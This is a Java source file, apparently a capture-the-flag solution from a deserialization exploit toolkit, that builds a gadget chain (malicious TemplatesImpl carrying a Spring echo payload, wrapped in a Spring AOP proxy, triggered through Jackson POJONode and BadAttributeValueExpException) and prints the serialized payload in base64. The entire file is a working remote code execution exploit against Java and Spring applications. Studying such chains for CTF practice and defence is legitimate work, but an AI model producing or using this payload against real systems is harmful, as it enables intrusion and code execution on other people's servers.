package dev.silente.javashark.solution;

import dev.silente.javashark.gadget.jdk.GBadAttributeValueExpException;
import dev.silente.javashark.gadget.springboot.GPOJONode;
import dev.silente.javashark.sink.jdk.STemplates;
import dev.silente.javashark.template.echo.SpringEcho;
import dev.silente.javashark.utils.MiscUtils;
import dev.silente.javashark.utils.SerializeUtils;
import org.springframework.aop.framework.AdvisedSupport;

import javax.xml.transform.Templates;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;

public class XS2023 {
    public static void main(String[] args) throws Exception {

        Object exp = STemplates.getEvilTemplates(MiscUtils.classAsBytes(SpringEcho.class));

        Class<?> clazz = Class.forName("org.springframework.aop.framework.JdkDynamicAopProxy");
        Constructor<?> cons = clazz.getDeclaredConstructor(AdvisedSupport.class);
        cons.setAccessible(true);
        AdvisedSupport advisedSupport = new AdvisedSupport();
        advisedSupport.setTarget(exp);
        InvocationHandler handler = (InvocationHandler) cons.newInstance(advisedSupport);
        Object proxyObj = Proxy.newProxyInstance(clazz.getClassLoader(), new Class[]{Templates.class}, handler);

        Object json = GPOJONode.toString2Getter(proxyObj);
        Object poc = GBadAttributeValueExpException.deserialize2ToString(json);

        byte[] code = SerializeUtils.serialize(poc);
        System.out.println(MiscUtils.base64Encode(code));
    }
}
